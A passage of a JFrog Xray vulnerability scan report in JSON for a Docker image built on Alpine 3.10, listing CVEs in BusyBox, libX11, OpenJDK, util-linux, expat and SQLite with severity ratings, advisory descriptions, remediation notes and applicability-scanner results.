                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:ssl_client:1.30.1-r5"
                    ],
                    "extended_information": {
                        "short_description": "A OOB heap read in Busybox lzma leads to data leakage and denial of service when decompressing a malformed LZMA-based archive.",
                        "full_description": "The [BusyBox](https://busybox.net/) toolkit implements a large number of Linux tools in a single executable and can even replace the Linux init system. Its small size and flexibility make it popular in embedded devices.\n\nAn out-of-bounds heap read in `unlzma` leads to information leak and denial of service when crafted LZMA-compressed input is decompressed. This can be triggered by any applet/format that internally supports LZMA compression.\nAn attacker that can pass an LZMA-based archive to be decompressed, can cause data leakage and denial of service.\nNote that the following applets all accept and decompress an LZMA-based archive:\n`unlzma`, `tar`, `unzip`, `rpm`, `dpkg`, `man`\n\nAs shown in the [JFrog blogpost](https://jfrog.com/blog/unboxing-busybox-14-new-vulnerabilities-uncovered-by-claroty-and-jfrog/), the attack is most potent when the victim unzips a crafted zip archive, since there are no special requirements on the unzipped filename and the leaked data can be archived back into the original zip archive.",
                        "jfrog_research_severity": "High",
                        "jfrog_research_severity_reasons": [
                            {
                                "name": "The issue has a detailed technical explanation published, that can aid in exploit development",
                                "is_positive": false
                            },
                            {
                                "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                                "description": "The attacker would need to determine which external input propagates into the applet's command line arguments",
                                "is_positive": true
                            }
                        ],
                        "remediation": "##### Development mitigations\n\nComment out `CONFIG_UNLZMA=y`, `CONFIG_FEATURE_SEAMLESS_LZMA=y` and `CONFIG_FEATURE_UNZIP_LZMA=y` in Busybox's `.config` file and recompile"
                    },
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2021-42374",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-533248",
                    "summary": "A vulnerability was found in libX11 due to an integer overflow within the XCreateImage() function. This flaw allows a local user to trigger an integer overflow and execute arbitrary code with elevated privileges.",
                    "description": "A vulnerability was found in libX11 due to an integer overflow within the XCreateImage() function. This flaw allows a local user to trigger an integer overflow and execute arbitrary code with elevated privileges.",
                    "issue_type": "security",
                    "severity": "High",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2023-43787",
                            "cwe": [
                                "CWE-190"
                            ],
                            "cvss_v3": "7.8/CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
                        }
                    ],
                    "created": "2023-10-10T00:00:00.780Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:libx11:1.6.12-r1"
                    ],
                    "extended_information": {
                        "short_description": "Integer overflow in libX11 may lead to remote code execution when parsing malicious images.",
                        "full_description": "[libX11](https://gitlab.freedesktop.org/xorg/lib/libx11), or Xlib, is a vital library for Unix-like systems that provides a low-level programming interface for creating graphical user interfaces, managing windows, and handling input events in the X Window System.\n\n[libXpm](https://gitlab.freedesktop.org/xorg/lib/libxpm), also known as the X PixMap library, is an essential component in Unix-like systems. It enables developers to work with pixmap images, offering support for creating, manipulating, and displaying these images in X Window System applications.\n\nAn integer overflow was discovered due to a missing check inside both libXpm and libX11, which may lead to remote code execution.\nThe 'XCreateImage()' function in libX11 did not check properly for the image dimensions when creating a new image, which leads to an integer overflow.\nAs part of the bug report, a proof-of-concept demonstrating remote code execution was included.\n\nThe PoC leveraged the bug in libXpm code during the parsing of Pixmap images to trigger the vulnerability in libX11.\nThis vulnerability can be exploited through various means, including the 'sxpm' command-line tool provided by libXpm for displaying Pixmap images on the screen, as well as any application that utilizes the vulnerable functions (for example, `XpmReadFileToPixmap`) within libXpm to parse Pixmap images.\n\nAn example for a vulnerable Xpm code snippet:\n```\n#include <stdio.h>\n#include <X11/Xlib.h>\n#include <X11/Xutil.h>\n\nmain()\n{\n\tDisplay *display;\n\tPixmap *pixmap, *shape;\n\tWindow window, rootwindow;\n\tint width, height, screen;\n\tchar* xpmfile = \"file.xpm\";\n\n\tdisplay = XOpenDisplay (NULL);\n\tscreen = DefaultScreen (display);\n\twidth = DisplayWidth (display, screen);\n\theight = DisplayHeight (display, screen);\n\trootwindow = RootWindow (display, screen);\n\n\twindow = XCreateSimpleWindow (display, rootwindow, 0, 0, width, height, 0, 0, 0);\n\tXpmReadFileToPixmap (display, window, xpmfile, &pixmap, &shape, NULL);\n}\n```",
                        "jfrog_research_severity": "High",
                        "jfrog_research_severity_reasons": [
                            {
                                "name": "The issue has an exploit published",
                                "description": "JFrog Security Research team created an exploit that demonstrates remote code execution.",
                                "is_positive": false
                            },
                            {
                                "name": "The issue results in a severe impact (such as remote code execution)",
                                "description": "Remote Code Execution",
                                "is_positive": false
                            },
                            {
                                "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                                "description": "An attacker must find input that propagates into the vulnerable functions of libX11 (for example, `XpmReadFileToPixmap`).",
                                "is_positive": true
                            }
                        ]
                    },
                    "applicability": [
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libx11:1.6.12-r1",
                            "cve_id": "CVE-2023-43787",
                            "scan_status": 1,
                            "applicability": false,
                            "scanner_explanation": "<p>The scanner checks whether any of the following vulnerable functions are called:</p>\n<ul>\n<li><code>XCreateImage</code></li>\n<li><code>XpmCreateImageFromXpmImage</code></li>\n<li><code>XpmCreateImageFromBuffer</code></li>\n<li><code>XpmCreateImageFromData</code></li>\n<li><code>XpmCreatePixmapFromXpmImage</code></li>\n<li><code>XpmCreatePixmapFromBuffer</code></li>\n<li><code>XpmCreatePixmapFromData</code></li>\n<li><code>XpmReadFileToImage</code></li>\n<li><code>XpmReadFileToPixmap</code></li>\n</ul>",
                            "evidence": null,
                            "info": "No references to the vulnerable function were found",
                            "details": null
                        }
                    ],
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libx11:1.6.12-r1",
                            "vulnerability_id": "CVE-2023-43787",
                            "result": "not_applicable"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-590727",
                    "summary": "Vulnerability in the Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Security).  Supported versions that are affected are Oracle Java SE: 8u391, 8u391-perf, 11.0.21, 17.0.9, 21.0.1; Oracle GraalVM for JDK: 17.0.9, 21.0.1; Oracle GraalVM Enterprise Edition: 20.3.12, 21.3.8 and  22.3.4. Difficult to exploit vulnerability allows low privileged attacker with logon to the infrastructure where Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition executes to compromise Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition.  Successful attacks of this vulnerability can result in  unauthorized access to critical data or complete access to all Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability can be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. This vulnerability also applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. CVSS 3.1 Base Score 4.7 (Confidentiality impacts).  CVSS Vector: (CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:H/I:N/A:N).",
                    "description": "Vulnerability in the Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Security).  Supported versions that are affected are Oracle Java SE: 8u391, 8u391-perf, 11.0.21, 17.0.9, 21.0.1; Oracle GraalVM for JDK: 17.0.9, 21.0.1; Oracle GraalVM Enterprise Edition: 20.3.12, 21.3.8 and  22.3.4. Difficult to exploit vulnerability allows low privileged attacker with logon to the infrastructure where Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition executes to compromise Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition.  Successful attacks of this vulnerability can result in  unauthorized access to critical data or complete access to all Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability can be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. This vulnerability also applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. CVSS 3.1 Base Score 4.7 (Confidentiality impacts).  CVSS Vector: (CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:H/I:N/A:N).",
                    "issue_type": "security",
                    "severity": "Unknown",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2024-20945",
                            "cwe": [
                                "NVD-CWE-noinfo"
                            ]
                        }
                    ],
                    "created": "2024-02-17T00:00:00.809Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-lib:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-base:8.275.01-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2024-20945",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-180636",
                    "summary": "An integer overflow in util-linux through 2.37.1 can potentially cause a buffer overflow if an attacker were able to use system resources in a way that leads to a large number in the /proc/sysvipc/sem file. NOTE: this is unexploitable in GNU C Library environments, and possibly in all realistic environments.",
                    "description": "An integer overflow in util-linux through 2.37.1 can potentially cause a buffer overflow if an attacker were able to use system resources in a way that leads to a large number in the /proc/sysvipc/sem file. NOTE: this is unexploitable in GNU C Library environments, and possibly in all realistic environments.",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2021-37600",
                            "cwe": [
                                "CWE-190"
                            ],
                            "cvss_v2": "1.2/CVSS:2.0/AV:L/AC:H/Au:N/C:N/I:N/A:P",
                            "cvss_v3": "5.5/CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H"
                        }
                    ],
                    "created": "2021-08-01T00:00:00.706Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:libuuid:2.33.2-r0"
                    ],
                    "extended_information": {
                        "short_description": "Integer overflow in util-linux can cause a potential buffer overflow but turns out to be unexploitable.",
                        "full_description": "The [Util-linux](https://github.com/util-linux/util-linux) package contains miscellaneous utility programs. Among them are utilities for handling file systems, consoles, partitions, and messages.\n\nAn integer overflow in `ipcutils`, in `sys-util` module of `util-linux` tool, was possibly causing buffer overflow but it turns out to be unexploitable. It seems to cause a buffer truncation instead of overflow and it is passed to overflow-safe functions so basically it is a bug to keep the integrity of the data.",
                        "jfrog_research_severity": "Low",
                        "jfrog_research_severity_reasons": [
                            {
                                "name": "The issue has been disputed by the vendor",
                                "description": "It turns out to be a bug that could cause data truncation in an impossible scenario.",
                                "is_positive": true
                            }
                        ]
                    },
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2021-37600",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-259758",
                    "summary": "In libexpat through 2.4.9, there is a use-after free caused by overeager destruction of a shared DTD in XML_ExternalEntityParserCreate in out-of-memory situations.",
                    "description": "In libexpat through 2.4.9, there is a use-after free caused by overeager destruction of a shared DTD in XML_ExternalEntityParserCreate in out-of-memory situations.",
                    "issue_type": "security",
                    "severity": "High",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2022-43680",
                            "cwe": [
                                "CWE-416"
                            ],
                            "cvss_v3": "7.5/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
                        }
                    ],
                    "created": "2022-10-25T00:00:00.565Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:expat:2.2.8-r0"
                    ],
                    "applicability": [
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:expat:2.2.8-r0",
                            "cve_id": "CVE-2022-43680",
                            "scan_status": 1,
                            "applicability": false,
                            "scanner_explanation": "<p>The scanner checks whether any of the following vulnerable functions are called:</p>\n<ul>\n<li><code>XML_Parse</code></li>\n<li><code>XML_ParseBuffer</code></li>\n</ul>",
                            "evidence": null,
                            "info": "No references to the vulnerable function were found",
                            "details": null
                        }
                    ],
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:expat:2.2.8-r0",
                            "vulnerability_id": "CVE-2022-43680",
                            "result": "not_applicable"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-514978",
                    "summary": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Swing).  Supported versions that are affected are Oracle Java SE: 8u361, 8u361-perf, 11.0.18, 17.0.6, 20; Oracle GraalVM Enterprise Edition: 20.3.9, 21.3.5 and  22.3.1. Easily exploitable vulnerability allows unauthenticated attacker with network access via HTTP to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition.  Successful attacks of this vulnerability can result in  unauthorized update, insert or delete access to some of Oracle Java SE, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.3 (Integrity impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N).",
                    "description": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Swing).  Supported versions that are affected are Oracle Java SE: 8u361, 8u361-perf, 11.0.18, 17.0.6, 20; Oracle GraalVM Enterprise Edition: 20.3.9, 21.3.5 and  22.3.1. Easily exploitable vulnerability allows unauthenticated attacker with network access via HTTP to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition.  Successful attacks of this vulnerability can result in  unauthorized update, insert or delete access to some of Oracle Java SE, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.3 (Integrity impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N).",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2023-21939",
                            "cwe": [
                                "NVD-CWE-noinfo"
                            ],
                            "cvss_v3": "5.3/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N"
                        }
                    ],
                    "created": "2023-04-19T00:00:00.570Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-base:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-lib:8.275.01-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2023-21939",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-586132",
                    "summary": "A vulnerability was found in SQLite SQLite3 up to 3.43.0 and classified as critical. This issue affects the function sessionReadRecord of the file ext/session/sqlite3session.c of the component make alltest Handler. The manipulation leads to heap-based buffer overflow. It is recommended to apply a patch to fix this issue. The associated identifier of this vulnerability is VDB-248999.",
                    "description": "A vulnerability was found in SQLite SQLite3 up to 3.43.0 and classified as critical. This issue affects the function sessionReadRecord of the file ext/session/sqlite3session.c of the component make alltest Handler. The manipulation leads to heap-based buffer overflow. It is recommended to apply a patch to fix this issue. The associated identifier of this vulnerability is VDB-248999.",
                    "issue_type": "security",
                    "severity": "High",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2023-7104",
                            "cwe": [
                                "CWE-119"
                            ],
                            "cvss_v3": "7.3/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L"
                        }
                    ],
                    "created": "2024-01-05T00:00:00.912Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:sqlite-libs:3.28.0-r3"
                    ],
                    "extended_information": {
                        "short_description": "An out-of-bounds read in SQLite can lead to denial of service when opening a crafted database file.",
                        "jfrog_research_severity": "Medium",
                        "jfrog_research_severity_reasons": [
                            {
                                "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                                "description": "The attackers must find a remote input that propagates to the SQLite open methods - \n\n* `sqlite3_open`\n*  `sqlite3_open16`\n* `sqlite3_open_v2`\n\nThe vulnerability can also be exploited for DoS when opening a database with the `sqlite3` command line utility, but in that case it would have no security impact (crashing a forked client process)",
                                "is_positive": true
                            },
                            {
                                "name": "The issue has an exploit published",
                                "description": "The published PoC leads to a denial of service.",
                                "is_positive": false
                            },
                            {
                                "name": "The prerequisites for exploiting the issue are extremely unlikely",
                                "description": "It is unlikely that an attacker will be able to supply a crafted database for the SQLite client to open.",
                                "is_positive": true
                            }
                        ]
                    },
                    "applicability": [
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:sqlite-libs:3.28.0-r3",
                            "cve_id": "CVE-2023-7104",
                            "scan_status": 1,
                            "applicability": false,
                            "scanner_explanation": "<p>The scanner checks whether any of the vulnerable functions are called -</p>\n<ul>\n<li><code>sqlite3_open()</code></li>\n<li><code>sqlite3_open16()</code> </li>\n<li><code>sqlite3_open_v2()</code></li>\n</ul>\n<p>Note that vulnerability can also be exploited for DoS when opening a database with the <code>sqlite3</code> command line utility, but in that case it would have no security impact (crashing a forked client process)</p>",
                            "evidence": null,
                            "info": "A vulnerable open function of sqlite3 is not called",
                            "details": null
                        }
                    ],
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:sqlite-libs:3.28.0-r3",
                            "vulnerability_id": "CVE-2023-7104",
                            "result": "not_applicable"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-190219",
                    "summary": "A use-after-free in Busybox's awk applet leads to denial of service and possibly code execution when processing a crafted awk pattern in the evaluate function",
                    "description": "A use-after-free in Busybox's awk applet leads to denial of service and possibly code execution when processing a crafted awk pattern in the evaluate function",
                    "issue_type": "security",
                    "severity": "High",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2021-42385",
                            "cwe": [
                                "CWE-416"
                            ],
                            "cvss_v2": "6.5/CVSS:2.0/AV:N/AC:L/Au:S/C:P/I:P/A:P",
                            "cvss_v3": "7.2/CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H"
                        }
                    ],
                    "created": "2021-11-18T00:00:00.412Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:ssl_client:1.30.1-r5",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:busybox:1.30.1-r5"
                    ],
                    "extended_information": {
                        "short_description": "A use-after-free in Busybox awk leads to remote code execution when processing malformed command line arguments.",
                        "full_description": "The [BusyBox](https://busybox.net/) toolkit implements a large number of Linux tools in a single executable and can even replace the Linux init system. Its small size and flexibility make it popular in embedded devices.\n\nA use-after-free in awk leads to denial of service and possibly code execution when processing a crafted awk pattern in the `evaluate` function.\nAn attacker that controls the `awk` pattern (through the command line argument) can trigger this issue.",
                        "jfrog_research_severity": "Medium",
                        "jfrog_research_severity_reasons": [
                            {
                                "name": "The prerequisites for exploiting the issue are extremely unlikely",
                                "description": "The applet must accept arbitrary command line arguments from an external source",
                                "is_positive": true
                            },
                            {
                                "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                                "description": "The attacker would need to determine which external input propagates into the applet's command line arguments",
                                "is_positive": true
                            },
                            {
                                "name": "The issue cannot result in a severe impact (such as remote code execution)",
                                "description": "Full control of the `awk` pattern usually leads to RCE, without needing to exploit this UAF. The issue is mostly relevant if the attacker can control the pattern, but it is filtered before being passed to `awk`.",
                                "is_positive": true
                            }
                        ],
                        "remediation": "##### Development mitigations\n\nComment out `CONFIG_AWK=y` in Busybox's `.config` file and recompile"
                    },
                    "applicability": [
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:busybox:1.30.1-r5",
                            "cve_id": "CVE-2021-42385",
                            "scan_status": 1,
                            "applicability": false,
                            "evidence": [
                                {
                                    "column_names": [
                                        "Path",
                                        "Evidence",
                                        "Line Number",
                                        "Issue Found"
                                    ],
                                    "rows": [
                                        [
                                            "/bin/busybox",
                                            "awk",
                                            "2988",
                                            "Busybox executable with awk applet was found"
                                        ],
                                        [
                                            "/bin/busybox",
                                            "awk",
                                            "4192",
                                            "Busybox executable with awk applet was found"
                                        ]
                                    ]
                                }
                            ],
                            "info": "Vulnerable usage of awk was {not }found",
                            "details": [
                                {
                                    "file_path": "/bin/busybox",
                                    "details": "Evidence: awk, Line Number: 2988, Issue Found: Busybox executable with awk applet was found"
                                },
                                {
                                    "file_path": "/bin/busybox",
                                    "details": "Evidence: awk, Line Number: 4192, Issue Found: Busybox executable with awk applet was found"
                                }
                            ]
                        },
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:ssl_client:1.30.1-r5",
                            "cve_id": "CVE-2021-42385",
                            "scan_status": 1,
                            "applicability": false,
                            "evidence": [
                                {
                                    "column_names": [
                                        "Path",
                                        "Evidence",
                                        "Line Number",
                                        "Issue Found"
                                    ],
                                    "rows": [
                                        [
                                            "/bin/busybox",
                                            "awk",
                                            "2988",
                                            "Busybox executable with awk applet was found"
                                        ],
                                        [
                                            "/bin/busybox",
                                            "awk",
                                            "4192",
                                            "Busybox executable with awk applet was found"
                                        ]
                                    ]
                                }
                            ],
                            "info": "Vulnerable usage of awk was {not }found",
                            "details": [
                                {
                                    "file_path": "/bin/busybox",
                                    "details": "Evidence: awk, Line Number: 2988, Issue Found: Busybox executable with awk applet was found"
                                },
                                {
                                    "file_path": "/bin/busybox",
                                    "details": "Evidence: awk, Line Number: 4192, Issue Found: Busybox executable with awk applet was found"
                                }
                            ]
                        }
                    ],
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:busybox:1.30.1-r5",
                            "vulnerability_id": "CVE-2021-42385",
                            "result": "not_applicable"
                        },
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:ssl_client:1.30.1-r5",
                            "vulnerability_id": "CVE-2021-42385",
                            "result": "not_applicable"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-195100",
                    "summary": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Libraries). Supported versions that are affected are Oracle Java SE: 7u321, 8u311, 11.0.13, 17.0.1; Oracle GraalVM Enterprise Edition: 20.3.4 and 21.3.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Oracle Java SE, Oracle GraalVM Enterprise Edition. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).",
                    "description": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Libraries). Supported versions that are affected are Oracle Java SE: 7u321, 8u311, 11.0.13, 17.0.1; Oracle GraalVM Enterprise Edition: 20.3.4 and 21.3.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Oracle Java SE, Oracle GraalVM Enterprise Edition. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2022-21294",
                            "cwe": [
                                "NVD-CWE-noinfo"
                            ],
                            "cvss_v2": "5.0/CVSS:2.0/AV:N/AC:L/Au:N/C:N/I:N/A:P",
                            "cvss_v3": "5.3/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
                        }
                    ],
                    "created": "2022-01-20T00:00:00.908Z",
                    "impact_path": [
